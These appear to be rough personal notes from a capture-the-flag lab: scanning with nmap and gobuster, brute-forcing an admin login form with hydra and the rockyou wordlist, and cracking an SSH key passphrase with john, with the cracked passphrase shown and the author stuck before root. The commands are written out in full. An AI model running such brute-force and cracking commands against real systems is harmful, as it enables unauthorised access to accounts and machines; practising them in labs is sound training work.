nmap
then gobuster 
/admin login 
admin username in comments of admin page

hydra -l admin -P ~/Desktop/SecLists-master/Passwords/Leaked-Databases/rockyou.txt  10.10.120.139 -V http-form-post '/admin:user=^USER^&pass=^PASS^:F=Username'


hydra -l admin -P ~/Desktop/SecLists-master/Passwords/Leaked-Databases/5wordRock.txt  10.10.120.139 -V http-form-post '/admin:user=^USER^&pass=^PASS^:F=Username or password invalid'


this ddint work. even wrote a python script to strip all the 6 word letters. i used copys of previous writeups commands and nada 



 john --wordlist=~/Desktop/SecLists-master/Passwords/Leaked-Databases/rockyou.txt  john.hash

rockinroll       (id_rsa) 


supposed to get the root users password, im not sure how to do that. 